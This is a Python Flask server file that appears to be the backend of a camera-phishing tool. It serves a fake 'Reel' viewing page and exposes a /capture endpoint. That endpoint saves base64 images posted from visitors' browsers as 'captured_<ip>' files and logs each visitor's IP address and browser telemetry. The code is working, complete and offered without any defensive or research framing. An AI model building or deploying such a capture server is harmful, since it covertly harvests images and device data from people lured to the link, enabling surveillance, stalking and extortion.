# app.py
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_cors import CORS
import datetime
import base64
import os

app = Flask(__name__)
CORS(app) # Allows cross-origin requests

# Ensure a directory exists for logs and images
if not os.path.exists('logs'):
    os.makedirs('logs')

@app.route('/')
def home():
    return redirect(url_for('view_reel', reel_id='test'))

@app.route('/view/<reel_id>', methods=['GET'])
def view_reel(reel_id):
    print(f"[DEBUG] User accessing Reel: {reel_id}")
    return render_template('index.html', reel_id=reel_id)

@app.route('/capture', methods=['POST'])
def capture():
    print("[DEBUG] Capture request received...")
    
    # 1. Get Client IP
    client_ip = request.remote_addr
    
    # 2. Get Browser Telemetry
    browser_data = request.json
    
    # 3. Handle Image Data (Base64 to File)
    image_filename = None
    if 'image_data' in browser_data and browser_data['image_data']:
        try:
            # Split the Base64 string (format: data:image/jpeg;base64,xxxx)
            image_parts = browser_data['image_data'].split(';base64,')
            if len(image_parts) == 2:
                image_base64 = image_parts[1]
                image_bytes = base64.b64decode(image_base64)
                
                # Generate unique filename
                timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                image_filename = f"captured_{client_ip}_{timestamp}.jpg"
                
                # Save the image in the 'logs' folder
                with open(os.path.join('logs', image_filename), 'wb') as f:
                    f.write(image_bytes)
                print(f"[!] IMAGE SAVED: {image_filename}")
            else:
                print("[!] Error: Invalid image format")
        except Exception as e:
            print(f"[!] Image processing error: {str(e)}")
            browser_data['image_error'] = str(e)

    # 4. Log all telemetry to logs.txt
    log_entry = {
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": client_ip,
        "telemetry": browser_data,
        "image_saved": image_filename
    }
    
    with open("logs.txt", "a") as f:
        f.write(f"\n--- NEW ENTRY ---\n{log_entry}\n")

    return jsonify({"status": "success", "image_saved": image_filename}), 200

if __name__ == '__main__':
    print("[!] Starting Server on http://127.0.0.1:8080")
    app.run(port=8080, debug=False)
